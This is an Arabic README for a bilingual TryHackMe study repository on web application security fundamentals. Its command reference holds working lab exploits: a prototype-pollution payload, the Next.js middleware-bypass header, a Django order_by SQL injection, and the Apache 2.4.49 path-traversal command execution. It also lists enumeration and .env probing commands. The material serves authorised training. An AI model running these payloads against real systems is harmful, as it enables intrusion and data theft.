# 🛡️ أساسيات أمن تطبيقات الويب — الدليل الهندسي واختبار الاختراق المتقدم

[![المنصة: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red.svg?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/)
[![الموديول: Web Security](https://img.shields.io/badge/Module-Web%20App%20Security%20Fundamentals-blue.svg?style=for-the-badge)](https://tryhackme.com/module/web-application-security-fundamentals)
[![اللغة: ثنائي اللغة](https://img.shields.io/badge/اللغة-العربية%20%7C%20English-success.svg?style=for-the-badge)](#-هيكل-المستودع-ثنائي-اللغة)
[![التوثيق: ماركداون](https://img.shields.io/badge/التنسيق-100%25%20Markdown-orange.svg?style=for-the-badge&logo=markdown)](https://www.markdownguide.org/)

> **تبديل اللغة:** [🇬🇧 Click here to read the English version of this repository](./README.md)

---

## 📖 عن هذا المستودع

هذا المستودع عبارة عن **حقيبة تدريبية ومرجع هندسي وميداني متكامل** يغطي الرومات الأربعة التأسيسية لموديول **Web Application Security Fundamentals** على منصة **TryHackMe**.

على عكس منشورات الـ Write-ups التقليدية التي تكتفي بنسخ ولصق قيم الأعلام (Flags) المتغيرة، صُمم هذا المستودع ليكون **مرجعاً احترافياً يُرفع على GitHub ويُعتمد عليه في سوق العمل والمقابلات الوظيفية**:
1. **النموذج الذهني والمفاهيم الأمنية (Mental Models):** فهم الأساس المعماري لكل تقنية وثغرة.
2. **منهجية الاستدلال (Signals to Exploitation):** كيف تقرأ المؤشرات الخاملة في الهيدرز، وهيكل الـ DOM، وحركة الشبكة قبل كتابة أو إرسال أي حمولة استغلال.
3. **تفكيك كل تاسك خطوة بخطوة:** توجيه فكري وعملي لاستخراج الأدلة بنفسك من معملك الخاص دون حرق الحلول العشوائية.
4. **دليل القيمة في سوق العمل واختبار الاختراق الميداني:** ملف مستقل لكل روم يوضح كيف تتكرر هذه الثغرات في اختبارات الاختراق للشركات، وكيف تجني منها مكافآت صيد الثغرات (Bug Bounty) تصل إلى $5,000 – $35,000+، مع نماذج كتابة تقارير رسمية وأدلة الترقيع الدفاعي وأسئلة المقابلات الوظيفية.

---

## 🗂️ هيكل المستودع وتنظيم الملفات

تم تقسيم المستودع بحيث تمتلك كل غرفة (Room) مجلداً مستقلاً يحتوي على **توثيق كامل باللغتين العربية والإنجليزية** بالإضافة إلى **ملف القيمة الميدانية وسوق العمل**:

```
Web-Application-Security-Fundamentals/
│
├── 📂 01-walking-an-application/
│   ├── 📄 README.md                   # بوابة الروم ثنائية اللغة
│   ├── 📂 ar/                         # النسخة العربية الكاملة
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # تطبيقات سوق العمل ونماذج التقارير والترقيع
│   └── 📂 en/                         # النسخة الإنجليزية الكاملة
│       ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالإنجليزية
│       └── 📄 real-world-impact.md    # القيمة الميدانية وسوق العمل بالإنجليزية
│
├── 📂 02-content-discovery/
│   ├── 📄 README.md                   # بوابة الروم ثنائية اللغة
│   ├── 📂 ar/                         # النسخة العربية الكاملة
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # مسارات الاستطلاع، إدارة مساحة الهجوم، وسوق العمل
│   └── 📂 en/                         # النسخة الإنجليزية الكاملة
│       ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالإنجليزية
│       └── 📄 real-world-impact.md    # القيمة الميدانية وسوق العمل بالإنجليزية
│
├── 📂 03-modern-web-stacks/
│   ├── 📄 README.md                   # بوابة الروم ثنائية اللغة
│   ├── 📂 ar/                         # النسخة العربية الكاملة
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # ثغرات الأطر الحديثة، سلاسل الاستغلال، والترقيع
│   └── 📂 en/                         # النسخة الإنجليزية الكاملة
│       ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالإنجليزية
│       └── 📄 real-world-impact.md    # القيمة الميدانية وسوق العمل بالإنجليزية
│
├── 📂 04-web-server-attacks-i/
│   ├── 📄 README.md                   # بوابة الروم ثنائية اللغة
│   ├── 📂 ar/                         # النسخة العربية الكاملة
│   │   ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالعربية
│   │   └── 📄 real-world-impact.md    # أخطاء الإعداد الأمني، أدلة التأمين، والمقابلات
│   └── 📂 en/                         # النسخة الإنجليزية الكاملة
│       ├── 📄 README.md               # الشرح الكامل ومنهجية الحل بالإنجليزية
│       └── 📄 real-world-impact.md    # القيمة الميدانية وسوق العمل بالإنجليزية
│
├── 📂 cheatsheets/
│   ├── 📄 README.md                   # الملخص السريع وقائمة مراجعة المهارات (EN)
│   └── 📄 README.ar.md                # الملخص النهائي وقائمة الـ 15 مهارة للتحقق الذاتي (AR)
│
├── 📂 docs/
│   └── 📄 Web-Application-Security-Fundamentals-Arabic-Guide.pdf # نسخة الدليل العربي الأصلي PDF
├── 📄 .gitignore                      # ملف استبعاد المخلفات لـ Git
├── 📄 LICENSE                         # رخصة المصدر المفتوح MIT
├── 📄 README.md                       # الصفحة الرئيسية للمستودع بالإنجليزية
└── 📄 README.ar.md                    # الصفحة الرئيسية للمستودع بالعربية (أنت هنا)
```

---

## 🗺️ خريطة الرومات والفهرس السريع

| رقم الروم | اسم الروم | محاور التركيز التقنية | الدليل بالعربية | الدليل بالإنجليزية | ملف سوق العمل والتقارير |
|:---:|---|---|:---:|:---:|:---:|
| **01** | **Walking An Application** | أدوات المطورين في المتصفح كمنظومة هجومية، فحص الـ DOM الحي، نقاط التوقف البرمجية Breakpoints، مراقبة طلبات الـ API، وأعلام حماية الكوكيز. | [اقرأ عربي](./01-walking-an-application/ar/README.md) | [Read EN](./01-walking-an-application/en/README.md) | [عربي](./01-walking-an-application/ar/real-world-impact.md) \| [EN](./01-walking-an-application/en/real-world-impact.md) |
| **02** | **Content Discovery** | معمارية الاستكشاف ثلاثية الطبقات: الفحص اليدوي (`robots.txt`, `sitemap.xml`, Headers)، استخبارات المصادر المفتوحة OSINT (Google Dorking, GitHub, S3)، والتخمين الآلي عبر Gobuster بأوضاعه الثلاثة (`dir`, `dns`, `vhost`). | [اقرأ عربي](./02-content-discovery/ar/README.md) | [Read EN](./02-content-discovery/en/README.md) | [عربي](./02-content-discovery/ar/real-world-impact.md) \| [EN](./02-content-discovery/en/real-world-impact.md) |
| **03** | **Modern Web Stacks** | قراءة البصمة السلبية واستغلال 4 ثغرات مصنعية واقعية: تلوث النموذج الأولي (Express)، تجاوز مصادقة الـ Middleware في Next.js، حقن SQL في دوال الترتيب بدجانغو، وتخطي مسارات أباتشي 2.4.49 وتنفيذ الأوامر RCE. | [اقرأ عربي](./03-modern-web-stacks/ar/README.md) | [Read EN](./03-modern-web-stacks/en/README.md) | [عربي](./03-modern-web-stacks/ar/real-world-impact.md) \| [EN](./03-modern-web-stacks/en/real-world-impact.md) |
| **04** | **Web Server Attacks - I** | تدقيق أخطاء الإعداد الأمني عبر 4 خوادم لينكس: Apache2 (`mod_status`, الفهرسة المفتوحة)، خادم بايثون المدمج (انعدام المصادقة)، Express (تسريبات وضع التطوير)، و Nginx (`stub_status`, `autoindex`). | [اقرأ عربي](./04-web-server-attacks-i/ar/README.md) | [Read EN](./04-web-server-attacks-i/en/README.md) | [عربي](./04-web-server-attacks-i/ar/real-world-impact.md) \| [EN](./04-web-server-attacks-i/en/real-world-impact.md) |

---

## 🧬 جدول الثغرات المصنعية الحقيقية (CVE Reference)

| إطار العمل المستهدف | رمز الثغرة (CVE) | التقييم (CVSS v3.1) | مسار الهجوم (Attack Vector) | الأثر الميداني في بيئات الإنتاج |
|---|---|---|---|---|
| **MERN / Express** | [CVE-2020-8203](https://nvd.nist.gov/vuln/detail/CVE-2020-8203) | **7.4 High** | تلويث النموذج الأولي عبر دمج غير آمن لكائنات JSON | تصعيد الصلاحيات والحصول على دور المدير (`isAdmin: true`) |
| **Next.js App Router** | [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927) | **9.1 Critical** | انتحال ترويسة الطلب الداخلي `x-middleware-subrequest` | تجاوز كامل وفوري لبوابة المصادقة المركزية للـ Middleware |
| **Django ORM** | [CVE-2021-35042](https://nvd.nist.gov/vuln/detail/CVE-2021-35042) | **9.8 Critical** | دمج نصوص المستخدم مباشرة داخل جملة `order_by()` | تسريب محتويات قواعد البيانات عبر أخطاء XPath بـ `updatexml()` |
| **Apache LAMP** | [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) | **9.8 Critical** | خطأ في ترتيب فك الترميز بـ `ap_normalize_path` مع `mod_cgi` | قراءة أي ملف في النظام وتنفيذ أوامر شيل كاملة عن بُعد (RCE) |

---

## ⚡ مرجع الأوامر السريعة والشاملة

```bash
# ================================================================
# 1. أوامر استكشاف المحتوى والاستطلاع (الروم الثاني)
# ================================================================
# فحص ملفات التوجيه وترويسات السيرفر
curl -s http://MACHINE_IP/robots.txt
curl -s http://MACHINE_IP/sitemap.xml
curl -sI http://MACHINE_IP/

# التخمين الآلي للمسارات والملفات المنسية
gobuster dir -u http://MACHINE_IP/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -x txt,php,html,bak,log -t 20

# فحص النطاقات الفرعية الحقيقية عبر الـ DNS
gobuster dns -d example.thm \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --wildcard

# فحص المضيفين الافتراضيين الداخليين عبر هيدر Host مباشرة
gobuster vhost -u http://MACHINE_IP/ \
  --domain example.thm \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain --exclude-length 250-320

# ================================================================
# 2. سلاسل استغلال ثغرات بيئات الويب الحديثة (الروم الثالث)
# ================================================================
# بيئة Express: إرسال حمولة تلويث النموذج الأولي لتصعيد الصلاحيات
curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

# بيئة Next.js: تجاوز الـ Middleware بالهيدر السري
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://MACHINE_IP:3001/dashboard

# بيئة Django: استخراج اسم قاعدة البيانات عبر خطأ الـ XPath
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(SELECT%20database())),1)" \
  | grep -o '~[0-9a-zA-Z_][^&]*'

# خادم أباتشي 2.4.49: تخطي المسار وتنفيذ أوامر RCE (إلزامية راية --path-as-is)
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id; cat /flag.txt'

# ================================================================
# 3. تدقيق أخطاء إعداد خوادم الويب (الروم الرابع)
# ================================================================
# فحص غياب ترويسات الأمان عبر كافة المنافذ
for port in 80 8000 3000 8080; do
  echo "=== المنفذ $port ==="
  curl -sI http://MACHINE_IP:$port/ | grep -iE "x-frame|x-content-type|content-security|strict-transport|referrer" || echo "[-] لا توجد أي ترويسة أمان!"
done

# فحص لوحات التشخيص والمراقبة المكشوفة
curl -s http://MACHINE_IP:80/server-status       # أباتشي mod_status
curl -s http://MACHINE_IP:8080/nginx_status      # إنجنكس stub_status
curl -s http://MACHINE_IP:8000/.env             # كشف ملفات النقطة في خادم بايثون
curl -s http://MACHINE_IP:3000/api/debug/env     # مسار تصحيح إكسبريس
```

---

## 🎯 المهارات المكتسبة وجاهزية سوق العمل

دراسة وتطبيق ما في هذا المستودع تمنحك مهارات معتمدة ومطلوبة في سوق العمل:
- [x] **أمن جهة العميل (Client-Side Security):** فهم الاختلاف بين الكود المصدري و DOM، وتجميد التنفيذ عبر الـ Breakpoints، وتدقيق خصائص الكوكيز (`HttpOnly`, `Secure`, `SameSite`).
- [x] **إدارة مساحة الهجوم (Attack Surface Management):** التمييز العملي بين فحص الـ DNS Subdomain والـ HTTP Virtual Host.
- [x] **الهندسة العكسية لثغرات أطر العمل:** فهم الأسباب الجذرية لثغرات تلوث النماذج الأولية، وهيدرز الـ Frameworks الداخلية، والتراجع عن حماية الـ ORMs.
- [x] **تأمين البنية التحتية (Infrastructure Hardening):** إغلاق الثغرات وضبط إعدادات خوادم لينكس وفق معايير CIS العالمية.
- [x] **كتابة التقارير المهنية (Report Writing):** صياغة الثغرات وفق تصنيف CVSS v3.1 مع شرح الأثر الميداني وتقديم كود الترقيع التنفيذي للمطورين.

---

## 📜 إخلاء المسؤولية الأخلاقية والقانونية

المحتوى المنشور في هذا المستودع مخصص لأغراض تعليمية بحتة وتدريب مصرح به على اختبار الاختراق الأخلاقي. طبق هذه الأدوات والتقنيات حصراً على الأنظمة والمختبرات التي تمتلك إذناً خطياً مسبقاً بفحصها (مثل معامل منصة TryHackMe الخاصة بك). الوصول غير المصرح به للأنظمة الحاسوبية يُعد جريمة يُعاقب عليها القانون.
